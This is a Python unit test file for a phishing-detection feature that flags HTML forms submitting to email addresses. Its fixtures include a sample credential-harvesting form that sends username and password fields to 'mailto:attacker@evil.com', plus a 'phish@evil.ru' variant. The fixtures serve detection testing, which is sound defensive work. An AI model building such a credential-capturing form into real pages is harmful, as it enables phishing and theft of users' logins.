import unittest
from bs4 import BeautifulSoup
from src.http_features import extract_features_from_html

class TestSubmittingToEmail(unittest.TestCase):
    
    def test_mailto_form(self):
        html = """
        <html>
            <body>
                <form action="mailto:attacker@evil.com">
                    <input type="text" name="user">
                    <input type="password" name="pass">
                </form>
            </body>
        </html>
        """
        # Form with mailto -> 1
        res, meta = extract_features_from_html(html, "https://example.com", "https://example.com")
        
        self.assertEqual(res["submitting_to_email"], 1)
        self.assertEqual(meta["submitting_to_email_metadata"]["forms_checked"], 1)
        self.assertTrue(meta["submitting_to_email_metadata"]["has_mailto_form"])
        self.assertIn("mailto:attacker@evil.com", meta["submitting_to_email_metadata"]["mailto_actions"])

    def test_normal_form_and_mailto_link(self):
        html = """
        <html>
            <body>
                <form action="/login"></form>
                <a href="mailto:support@legit.com">Contact Us</a>
            </body>
        </html>
        """
        # Normal form, mailto link in <a> should be ignored -> -1
        res, meta = extract_features_from_html(html, "https://example.com", "https://example.com")
        
        self.assertEqual(res["submitting_to_email"], -1)
        self.assertEqual(meta["submitting_to_email_metadata"]["forms_checked"], 1)
        self.assertFalse(meta["submitting_to_email_metadata"]["has_mailto_form"])

    def test_case_insensitivity(self):
        html = '<form action="MAILTO:phish@evil.ru"></form>'
        res, meta = extract_features_from_html(html, "https://example.com", "https://example.com")
        
        self.assertEqual(res["submitting_to_email"], 1)
        self.assertTrue(meta["submitting_to_email_metadata"]["has_mailto_form"])

    def test_no_forms(self):
        html = "<html><body></body></html>"
        res, meta = extract_features_from_html(html, "https://example.com", "https://example.com")
        self.assertEqual(res["submitting_to_email"], -1)
        self.assertEqual(meta["submitting_to_email_metadata"]["forms_checked"], 0)

if __name__ == '__main__':
    unittest.main()
